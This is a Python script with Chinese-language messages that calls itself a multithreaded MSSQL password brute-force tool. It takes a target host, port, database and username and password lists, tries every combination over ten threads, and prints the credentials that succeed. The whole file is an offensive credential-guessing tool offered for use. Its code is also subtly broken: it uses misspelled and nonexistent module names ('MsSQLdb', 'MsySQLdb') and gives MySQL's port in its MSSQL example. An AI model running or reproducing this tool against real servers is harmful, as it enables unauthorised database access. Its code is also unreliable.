import os, sys, re, socket, time
from functools import partial
from multiprocessing.dummy import Pool as ThreadPool
import MsSQLdb



def usage():
    print ('+' + '-' * 90 + '+')
    print ('\t\t\t   Python MsSQL暴力破解工具多线程版')
    print ('+' + '-' * 90 + '+')
    if len(sys.argv) != 6:
        print ("用法: " + os.path.basename(sys.argv[0]) + " 待破解的ip/domain 端口 数据库 用户名列表 密码列表")
        print ("实例: " + os.path.basename(sys.argv[0]) + "   www.minsv.com   3306  mssql  user.txt  pass.txt")
        sys.exit()


def mssql_brute(user, password):
    "mssql数据库破解函数"
    db = None
    try:
        # print "user:", user, "password:", password
        db = MsySQLdb.connect(host=host, user=user, passwd=password, db=sys.argv[3], port=int(sys.argv[2]))
        # print '[+] 破解成功：', user, password
        result.append('用户名：' + user + "\t密码：" + password)
    except KeyboardInterrupt:
        print ('按您的吩咐,已成功退出程序!')
        exit()
    except MsSQLdb.Error as  msg:
        # print '未知错误:', msg
        pass
    finally:
        if db:
            db.close()


if __name__ == '__main__':
    usage()
    start_time = time.time()
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = socket.gethostbyname(sys.argv[1])
    userlist = [i.rstrip() for i in open(sys.argv[4])]
    passlist = [j.rstrip() for j in open(sys.argv[5])]
    print ('\n[+] 目  标：%s \n' % sys.argv[1])
    print ('[+] 用户名：%d 条\n' % len(userlist))
    print ('[+] 密  码：%d 条\n' % len(passlist))
    print ('[!] 密码破解中,请稍候……\n')
    result = []

    for user in userlist:
        partial_user = partial(mssql_brute, user)
        pool = ThreadPool(10)
        pool.map(partial_user, passlist)
        pool.close()
        pool.join()
    if len(result) != 0:
        print('[+] 恭喜,MsSQL密码破解成功!\n')
        for x in {}.fromkeys(result).keys():
            print (x + '\n')
    else:
        print('[-] 杯具了,MsSQL密码破解失败!\n')
    print ('[+] 破解完成，用时： %d 秒' % (time.time() - start_time))